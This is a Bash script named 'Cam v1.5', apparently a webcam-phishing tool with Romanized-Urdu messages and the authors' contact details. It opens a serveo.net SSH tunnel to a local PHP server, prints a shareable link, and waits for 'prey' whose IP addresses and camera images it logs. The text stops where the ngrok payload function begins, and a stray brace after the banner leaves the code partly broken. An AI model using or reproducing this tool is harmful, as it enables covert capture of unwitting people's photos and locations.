#!/bin/bash
# Cam v1.5
# Powered by BreathPython
# Credits goes to Najeeb Ullah -BreathPython and Hamza Qayyum [github.com/BreathPython/]

trap 'printf "\n";stop' 2
clear
printf "\033[1;97m                  *     \e[0m\n"
printf "\033[1;97m    (     (      (  )    \e[0m\n"
printf "\033[1;96m    )\    )\     )\))(     \e[0m\n"
printf "\033[1;95m  (((_)((((_)(  ((_)())   \e[0m\n"
printf "\033[1;94m  )\___ )\ _ )\ (_()((_)   \e[0m\n"
printf "\033[1;93m ((/ __|(_)_\(_)|  \/  |  \e[0m\n"
printf "\033[1;92m  | (__  / _ \  | |\/| |  \e[0m\n"
printf "\033[1;91m   \___|/_/ \_\ |_|  |_|  \e[0m\n"
printf "\033[1;93m    WhatsApp: +923124788959    \e[0m\n\n"
printf "\033[1;95m insta@itx.najeeb Facebook:fb.com/OyeJanu500\e[0m\n\n"
printf "\n"


}

dependencies() {


command -v php > /dev/null 2>&1 || { echo >&2 "Php install nahe hai. lehaza php package install kre or dobara koahish kren."; exit 1; }
 



}

stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1

}

catch_ip() {

ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip

cat ip.txt >> saved.ip.txt


}

checkfound() {

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Shikar ka intezar kre,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do


if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Shikar Phansne wala hai!\n"
catch_ip
rm -rf ip.txt

fi

sleep 0.5

if [[ -e "Log.log" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Taswere phnch rahi hai.Thora sabar rakhen!\e[0m\n"
rm -rf Log.log
fi
sleep 0.5

done 

}


server() {

command -v ssh > /dev/null 2>&1 || { echo >&2 "ssh tool install nahe hai. openssh Install kro. Dobara koahish kren."; exit 1; }

printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Server ko upgrade hone me thora waqt lagega...\e[0m\n"

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi

if [[ $subdomain_resp == true ]]; then

$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net  2> /dev/null > sendlink ' &

sleep 8
else
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink ' &

sleep 8
fi
printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Php server ko upgrade hone me thora waqt lagega... (localhost:3333)\e[0m\n"
fuser -k 3333/tcp > /dev/null 2>&1
php -S localhost:3333 > /dev/null 2>&1 &
sleep 3
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $send_link

}


payload_ngrok() {
